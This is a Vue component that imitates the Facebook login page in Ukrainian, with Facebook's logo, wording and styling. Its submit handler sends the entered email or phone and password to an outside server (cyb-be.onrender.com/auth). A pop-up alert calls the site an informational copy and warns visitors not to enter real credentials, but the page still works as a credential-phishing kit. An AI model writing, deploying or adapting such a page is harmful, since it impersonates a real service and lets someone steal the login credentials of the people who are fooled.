<template>
  <div class="login">
    <div class="login__text">
      <img
        class="login__text--logo"
        src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
        alt="Facebook"
      />
      <h2 class="login__text--subtext">
        Facebook допомагає тримати зв'язок з рідними та близькими.
      </h2>
    </div>
    <div class="login__form">
      <input
        class="input"
        type="email"
        placeholder="Електронна адреса або номер телефону"
        v-model="form.login"
      />
      <input class="input" type="password" placeholder="Пароль" v-model="form.password" />
      <button type="submit" class="btn btn--blue" @click="submit">Увійти</button>
      <p class="cl-blue">Забули пароль?</p>
      <div class="separator"></div>
      <button class="btn btn--green">Створити обліковий запис</button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { reactive, onMounted } from 'vue'
import axios from 'axios'

const form = reactive({
  login: '',
  password: ''
})

function submit() {
  axios
    .post('https://cyb-be.onrender.com/auth', {
      ...form
    })
    .then((res) => {
      console.log(res)
    })
  console.log(form)
}

onMounted(() => {
  alert(
    'Цей сайт є копією логіна соц мережі фейсбук і зроблений лише в інформативних цілях, не вводьте справжній емейл і пароль'
  )
})
</script>

<style scoped lang="sass">
.login
  padding: 72px 0 112px 0
  gap: 64px
  height: 550px
  display: flex
  justify-content: center
  align-items: center
  font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif

  &__text
    &--logo
      height: 108px
      margin: 0 -28px

    &--subtext
      font-size: 28px
      margin: 0
      font-weight: normal
      line-height: 32px
      width: 500px

  &__form
    align-items: center
    background-color: #fff
    border: none
    border-radius: 8px
    box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)
    box-sizing: border-box
    margin: 40px 0 0
    padding: 20px 20px 28px
    width: 396px
    display: flex
    flex-direction: column
    gap: 8px

    .input
      height: 50px
      width: 100%
      padding: 14px 16px
      border: 1px solid #dddfe2
      color: #1d2129
      font-family: Helvetica, Arial, sans-serif
      font-size: 12px
      line-height: 16px
      vertical-align: middle
      border-radius: 8px
      box-sizing: border-box

    .btn
      border: none
      border-radius: 6px
      font-size: 20px
      line-height: 48px
      padding: 0px 16px
      cursor: pointer
      color: #fff
      font-weight: bold

      &:hover
        opacity: 0.8

      &--blue
        width: 100%
        margin-top: 4px
        background-color: #0866ff

      &--green
        width: 80%
        background-color: #42b72a
        font-size: 17px

    .cl-blue
      color: #0866ff
      font-size: 14px
      font-weight: 500
      cursor: pointer
      margin: 16px 0 0 0

    .separator
      width: 100%
      align-items: center
      border-bottom: 1px solid #dadde1
      display: flex
      margin: 12px 16px 20px 16px
      text-align: center
</style>
